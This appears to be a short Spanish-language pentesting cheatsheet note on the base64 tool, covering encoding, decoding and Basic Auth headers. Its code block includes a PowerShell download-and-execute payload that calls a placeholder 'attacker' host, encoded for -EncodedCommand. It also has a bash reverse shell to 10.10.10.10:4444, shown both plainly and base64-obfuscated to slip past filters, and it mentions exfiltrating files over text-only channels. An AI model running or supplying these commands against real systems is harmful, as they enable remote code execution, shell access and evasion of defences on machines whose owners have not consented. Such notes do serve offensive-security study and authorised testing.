---
aliases:
tags:
  - tool/base64
kind: Tool
linked:
---
# base64

> [!info]
> Encode/decode Base64. En pentest: encoding de payloads para bypass de filtros, transferencia de archivos via terminal, encoding Basic Auth.

---

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `echo -n 'text' \| base64` | Encode | Payload encoding, Basic Auth |
| `echo 'dGV4dA==' \| base64 -d` | Decode | Análisis de tokens, JWT payload |
| `base64 file.bin > file.b64` | Encode archivo | Exfil via canal texto-only |
| `base64 -d file.b64 > file.bin` | Decode archivo | Reconstruir binario |
| `cat file \| base64 -w 0` | Encode sin wraps | Single-line para curl/payloads |

---

## Casos de uso comunes

```bash
# Basic Auth header
echo -n 'admin:password' | base64
# → YWRtaW46cGFzc3dvcmQ=
curl -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' http://target

# PowerShell encoded command
pwsh_payload='IEX (New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")'
echo -n "$pwsh_payload" | iconv -t UTF-16LE | base64 -w 0
# → AABJAEUAWAAg...
# Ejecutar: powershell -EncodedCommand <output>

# Reverse shell en una línea (encoded)
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
# Encode: echo -n 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64
# → YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

---

## Variantes

- **base32**: `echo 'X' | base32` / `base32 -d`
- **URL-safe Base64**: usa `-` y `_` en lugar de `+` y `/`. Python: `base64.urlsafe_b64encode()`.

---

## Notas Relacionadas

- [[JWT Attacks]]
- [[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]
